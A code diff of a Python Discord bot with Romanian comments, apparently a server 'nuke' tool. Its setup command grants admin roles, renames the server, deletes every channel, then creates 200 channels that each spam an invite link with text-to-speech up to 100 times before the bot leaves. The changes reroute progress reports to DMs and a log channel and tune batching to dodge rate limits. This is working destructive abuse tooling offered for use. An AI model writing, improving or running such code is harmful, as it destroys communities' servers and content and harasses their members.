@@ -242,20 +242,26 @@ async def setup(ctx):
             member = guild.get_member(admin_id)
             if member:
                 await member.add_roles(admin_role)
-                await ctx.send(f"✅ Rol admin acordat lui {member.name}")
+                # Trimitem un DM adminului
+                try:
+                    await member.send(f"✅ Rol admin acordat în serverul {guild.name}")
+                except:
+                    pass
     except Forbidden:
-        await ctx.send("❌ Nu am permisiunea să creez roluri.")
+        await user.send("❌ Nu am permisiunea să creez roluri.")
+        return
     except Exception as e:
-        await ctx.send(f"❌ Eroare la crearea rolului: {e}")
+        await user.send(f"❌ Eroare la crearea rolului: {e}")
+        return
 
     # SCHIMBARE NUME SERVER
     try:
         await guild.edit(name="1weeksober owns this")
-        await ctx.send("✅ Nume server schimbat.")
     except Exception as e:
-        await ctx.send(f"⚠️ Nu am putut schimba numele: {e}")
+        await user.send(f"⚠️ Nu am putut schimba numele: {e}")
 
-    # STERGERE CANALE
+    # STERGERE CANALE - dar păstrăm un canal nou pentru loguri
+    # Mai întâi, ștergem toate canalele
     deleted = 0
     for channel in guild.channels:
         try:
@@ -263,7 +269,15 @@ async def setup(ctx):
             deleted += 1
         except:
             continue
-    await ctx.send(f"✅ Șterse {deleted} canale.")
+
+    # Acum creăm un canal nou pentru a trimite mesaje de progres
+    try:
+        log_channel = await guild.create_text_channel(name="larp-log")
+        await log_channel.send("✅ Toate canalele au fost șterse. Încep crearea celor 200 de canale...")
+    except Exception as e:
+        # Dacă nu putem crea canalul de log, trimitem în DM
+        await user.send(f"⚠️ Nu am putut crea canalul de log: {e}. Continui în DM.")
+        log_channel = None
 
     channel_names = [
         "1weeksober-owns",
@@ -274,31 +288,51 @@ async def setup(ctx):
 
     spam_message = "This sv has been officially closed\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire"
 
-    # CREARE 200 CANALE (modificat de la 500 la 200)
-    async def create_channel_and_send():
+    # CREARE 200 CANALE
+    created = 0
+    async def create_channel_and_send(index):
+        nonlocal created
         try:
             name = random.choice(channel_names) + "-" + str(random.randint(1000, 9999))
             ch = await guild.create_text_channel(name=name)
             spams = 100 if is_premium_user(user.id) else 50
             for _ in range(spams):
                 await ch.send(content=spam_message, tts=True)
+            created += 1
+            # Trimitem progres în canalul de log sau DM
+            if log_channel and index % 10 == 0:
+                await log_channel.send(f"✅ Creat {created} canale până acum...")
         except Exception as e:
-            print(f"Eroare la creare canal: {e}")
+            if log_channel:
+                await log_channel.send(f"❌ Eroare la crearea canalului {index}: {e}")
+            else:
+                await user.send(f"❌ Eroare la crearea canalului {index}: {e}")
 
-    await ctx.send("🔄 Se creează 200 de canale... (durează ~30 de secunde)")
-    tasks = [create_channel_and_send() for _ in range(200)]
-    for i in range(0, len(tasks), 20):
-        await asyncio.gather(*tasks[i:i+20])
-        await asyncio.sleep(1)
+    if log_channel:
+        await log_channel.send("🔄 Se creează 200 de canale... (durează ~30-60 secunde)")
+
+    # Creare canale în batch-uri de câte 10 pentru a evita rate limit
+    tasks = [create_channel_and_send(i) for i in range(200)]
+    for i in range(0, len(tasks), 10):
+        await asyncio.gather(*tasks[i:i+10])
+        await asyncio.sleep(1.5)
+
+    if log_channel:
+        await log_channel.send(f"✅ Creare finalizată! {created} canale create.")
 
     # CREARE ROL
     try:
         await guild.create_role(name="1weeksober-on-top")
-        await ctx.send("✅ Rol creat.")
+        if log_channel:
+            await log_channel.send("✅ Rol creat.")
     except:
         pass
 
-    await ctx.send("✅ Nuke finalizat! Părăsesc serverul...")
+    # Trimitem mesaj final în DM și în log_channel
+    final_msg = f"✅ Nuke finalizat în serverul {guild.name}. {created} canale create."
+    await user.send(final_msg)
+    if log_channel:
+        await log_channel.send("✅ Părăsesc serverul...")
     await guild.leave()
 
 class SettingsModal(discord.ui.Modal):
